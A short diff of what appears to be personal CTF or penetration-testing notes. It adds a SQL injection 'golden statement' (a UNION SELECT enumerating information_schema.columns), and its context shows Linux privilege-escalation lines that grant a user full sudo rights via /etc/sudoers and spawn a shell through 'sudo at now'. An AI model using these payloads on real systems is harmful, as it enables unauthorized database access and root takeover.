@@ -1,8 +1,11 @@
 # Security
 ## Information
-4434478809
 
 
+## GOLDEN STATEMENT (CMD)
+```
+UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
+```
 
 ```
 CTFD:
@@ -1121,7 +1124,7 @@ Array
 
 ## GOLDEN STATEMENT (CMD)
 ```
-select table_schema,table_name,column_name from information_schema.columns;
+UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
 ```
 
 ## UNION.HTML POST METHOD (DEMO)
@@ -3954,7 +3957,7 @@ grep "PATH=" /home/*/.profile
 /usr/bin/sudo
 
 
-◦	./unknown /etc/sudoers "comrade ALL=(ALL:ALL) ALL"
+	◦	./unknown /etc/sudoers "comrade ALL=(ALL:ALL) ALL"
 	▪	add comrade with full permissions to the /etc/sudoers file
 	◦	echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
 
